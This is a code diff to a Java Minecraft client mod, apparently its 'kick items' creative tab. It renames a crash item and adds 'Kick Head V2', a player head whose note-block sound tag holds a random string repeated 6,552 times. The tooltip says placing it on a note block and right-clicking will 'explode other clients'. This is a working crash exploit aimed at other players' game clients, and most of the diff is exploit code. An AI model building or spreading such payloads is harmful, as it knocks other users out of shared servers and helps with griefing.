@@ -24,14 +24,15 @@ public class KickItemsCreativeTab extends CreativeTab {
         final Collection<ItemStack> current = super.entries();
         final VersionEnum targetVersion = ProtocolHack.getTargetVersion();
 
-        current.add(createItem(createPaperKickHead(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Paper Kick Head"), Text.literal(Formatting.GOLD + Formatting.BOLD.toString() + "Can crash older clients")));
+        current.add(createItem(createKickHead(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Kick Head"), Text.literal(Formatting.GOLD + Formatting.BOLD.toString() + "Can crash older clients")));
         if (targetVersion.isNewerThanOrEqualTo(VersionEnum.r1_20tor1_20_1)) {
+            current.add(createItem(createKickHeadV2(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Kick Head V2"), Text.literal(Formatting.AQUA + "Place on a note block and right click"), Text.literal(Formatting.AQUA + "the note block to explode other clients!")));
             current.add(createItem(createKickStand(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Kick Stand")));
         }
         return current;
     }
 
-    private ItemStack createPaperKickHead() {
+    private ItemStack createKickHead() {
         final var item = new ItemStack(Items.FURNACE);
         final var base = new NbtCompound();
 
@@ -50,6 +51,20 @@ public class KickItemsCreativeTab extends CreativeTab {
         items.add(firstSlot);
 
         blockEntityTag.put("Items", items);
+        base.put("BlockEntityTag", blockEntityTag);
+
+        item.setNbt(base);
+
+        return item;
+    }
+
+    private ItemStack createKickHeadV2() {
+        final var item = new ItemStack(Items.PLAYER_HEAD);
+
+        final var base = new NbtCompound();
+        final var blockEntityTag = new NbtCompound();
+
+        blockEntityTag.putString("note_block_sound", RandomStringUtils.randomAlphabetic(5).toLowerCase().repeat(6552));
         base.put("BlockEntityTag", blockEntityTag);
 
         item.setNbt(base);
